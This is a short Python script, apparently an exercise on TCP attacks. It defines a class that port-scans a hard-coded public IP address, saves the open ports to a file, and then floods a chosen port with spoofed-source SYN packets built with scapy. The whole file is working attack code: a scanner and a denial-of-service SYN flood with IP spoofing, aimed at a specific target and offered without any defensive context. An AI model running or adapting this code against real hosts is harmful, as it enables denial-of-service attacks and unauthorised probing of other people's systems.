
import socket
from scapy.all import *

class TcpAttack():
    def __init__(self, spoofIP:str, targetIP:str) -> None:
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        self.openPorts = []

    def scanTarget(self, rangeStart:int, rangeEnd:int) -> None:
        for port in range(rangeStart, rangeEnd + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((self.targetIP, port))
            if result == 0:
                self.openPorts.append(port)
            sock.close()

        with open("openports.txt", 'w') as FILE:
            for port in self.openPorts:
                FILE.write(str(port) + "\n")

    def attackTarget(self, port:int, numSyn:int) -> int:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        ipHeader = IP(src = self.spoofIP, dst = self.targetIP)
        tcpHeader = TCP(flags = "S", sport = RandShort(), dport = port)
        packet = ipHeader / tcpHeader
        try:
            for _ in range(numSyn):
                send(packet)
        except Exception as e:
            print("Error:", e)
            return 0
        finally:
            sock.close()
            return 1

        
if __name__ == '__main__':
    spoofIP = '10.10.10.10'
    targetIP = '128.46.144.123'
    rangeStart = 1700
    rangeEnd = 1800
    port = 1716
    numSyn = 100
    tcp = TcpAttack(spoofIP, targetIP)
    tcp.scanTarget(rangeStart, rangeEnd)
    if tcp.attackTarget(port, numSyn):
        print(f"Port {port} was open, and flooded with {numSyn} SYN packets")
